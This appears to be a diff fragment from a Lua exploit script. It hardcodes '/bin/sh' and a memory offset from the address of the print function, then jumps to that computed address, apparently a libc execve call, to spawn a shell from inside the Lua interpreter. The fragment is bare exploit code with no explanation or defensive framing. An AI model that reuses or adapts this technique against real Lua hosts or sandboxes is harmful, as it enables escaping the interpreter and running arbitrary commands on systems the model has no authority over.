@@ -205,9 +205,9 @@ local function executeC(addr, arg_a)
 	g()	
 end
 
-local b = arg[1] or '/bin/sh'
-local dif = arg[2] or (-104462)
---addr is the address of an instruction which calls libc's execve
+local b = '/bin/sh'
+local dif = -85680
+--addr is the address of the deisred function
 local addr = objAddr(print) + dif
 executeC(addr, bufferAddress(b))
 
